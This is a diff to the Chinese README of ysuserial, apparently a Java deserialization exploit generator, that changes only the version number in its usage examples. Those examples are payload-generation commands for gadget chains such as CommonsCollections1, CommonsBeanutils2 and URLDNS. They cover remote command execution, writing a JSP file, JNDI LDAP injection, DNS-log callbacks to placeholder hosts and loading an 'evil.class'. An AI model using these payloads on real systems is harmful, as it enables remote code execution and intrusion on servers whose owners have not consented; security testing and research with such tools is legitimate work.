@@ -19,7 +19,7 @@ For English Speaker : [ReadMe_en.md](./ReadMe_en.md)
 项目支持利用链展示：
 
 ```text
-$ java -jar ysuserial-0.5-su18-all.jar
+$ java -jar ysuserial-0.6-su18-all.jar
             _.-^^---....,,--
        _--                  --_
       <                        >)
@@ -36,7 +36,7 @@ $ java -jar ysuserial-0.5-su18-all.jar
 [root]#~  A Mind-Blowing Tool Collected By [ su18@javaweb.org ]
 [root]#~  Shout Out to Yzmm / Shxjia / Y4er / N1nty / C0ny1 / Phith0n / Kezibei
 [root]#~  AND OF COURSE TO THE All MIGHTY @frohoff  
-[root]#~  Usage: java -jar ysuserial-0.5-su18-all.jar [payload] '[command]'
+[root]#~  Usage: java -jar ysuserial-0.6-su18-all.jar [payload] '[command]'
 [root]#~  Available payload types:
 Jun 19, 2022 11:54:53 PM org.reflections.Reflections scan
 INFO: Reflections took 195 ms to scan 1 urls, producing 26 keys and 230 values 
@@ -122,7 +122,7 @@ ChainedTransformer 进行链式反射调用的利用方式，针对 CC 3.1-3.2.1
 **命令执行示例**：
 
 ```shell
-java -jar ysuserial-0.5-su18-all.jar CommonsCollections1 PB-lin-b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==
+java -jar ysuserial-0.6-su18-all.jar CommonsCollections1 PB-lin-b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==
 ```
 
 效果图：
@@ -132,7 +132,7 @@ java -jar ysuserial-0.5-su18-all.jar CommonsCollections1 PB-lin-b3BlbiAtYSBDYWxj
 **DNSLOG示例**：
 
 ```shell
-java -jar ysuserial-0.5-su18-all.jar CommonsCollections1 'DL-xxx.org'
+java -jar ysuserial-0.6-su18-all.jar CommonsCollections1 'DL-xxx.org'
 ```
 
 效果图：
@@ -142,7 +142,7 @@ java -jar ysuserial-0.5-su18-all.jar CommonsCollections1 'DL-xxx.org'
 **脚本引擎解析 JS 代码示例**：
 
 ```shell
-java -jar ysuserial-0.5-su18-all.jar CommonsCollections1 'SE-b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA=='
+java -jar ysuserial-0.6-su18-all.jar CommonsCollections1 'SE-b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA=='
 ```
 
 效果图：
@@ -152,7 +152,7 @@ java -jar ysuserial-0.5-su18-all.jar CommonsCollections1 'SE-b3BlbiAtYSBDYWxjdWx
 **文件写入示例**：
 
 ```shell
-java -jar ysuserial-0.5-su18-all.jar CommonsCollections1 'WF-/tmp/1.jsp#PCVAcGFnZSBwYWdlR.....'
+java -jar ysuserial-0.6-su18-all.jar CommonsCollections1 'WF-/tmp/1.jsp#PCVAcGFnZSBwYWdlR.....'
 ```
 
 效果图：
@@ -162,7 +162,7 @@ java -jar ysuserial-0.5-su18-all.jar CommonsCollections1 'WF-/tmp/1.jsp#PCVAcGFn
 **触发 JNDI 查询注入示例**：
 
 ```shell
-java -jar ysuserial-0.5-su18-all.jar CommonsCollections1 'JD-ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA=='
+java -jar ysuserial-0.6-su18-all.jar CommonsCollections1 'JD-ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA=='
 ```
 
 效果图：
@@ -172,7 +172,7 @@ java -jar ysuserial-0.5-su18-all.jar CommonsCollections1 'JD-ldap://127.0.0.1:13
 **普通命令执行示例**：
 
 ```shell
-java -jar ysuserial-0.5-su18-all.jar CommonsCollections1 'open -a Calculator.app'
+java -jar ysuserial-0.6-su18-all.jar CommonsCollections1 'open -a Calculator.app'
 ```
 
 效果图：
@@ -243,7 +243,7 @@ Tomcat Listener NeoReg 流量隧道：
 示例：
 
 ```shell
-java -jar ysuserial-0.5-su18-all.jar CommonsCollections3 LF-/tmp/evil.class
+java -jar ysuserial-0.6-su18-all.jar CommonsCollections3 LF-/tmp/evil.class
 ```
 
 效果图：
@@ -257,7 +257,7 @@ java -jar ysuserial-0.5-su18-all.jar CommonsCollections3 LF-/tmp/evil.class
 **普通命令执行示例**：
 
 ```shell
-java -jar ysuserial-0.5-su18-all.jar CommonsBeanutils2 'open -a Calculator.app'
+java -jar ysuserial-0.6-su18-all.jar CommonsBeanutils2 'open -a Calculator.app'
 ```
 
 效果图：
@@ -297,7 +297,7 @@ java -jar ysuserial-0.5-su18-all.jar CommonsBeanutils2 'open -a Calculator.app'
 示例：`all:xxxxxx.dns.log`
 
 ```shell
-java -jar ysuserial-0.5-su18-all.jar URLDNS 'all:xxxxxx.dns.log'
+java -jar ysuserial-0.6-su18-all.jar URLDNS 'all:xxxxxx.dns.log'
 ```
 
 效果图：
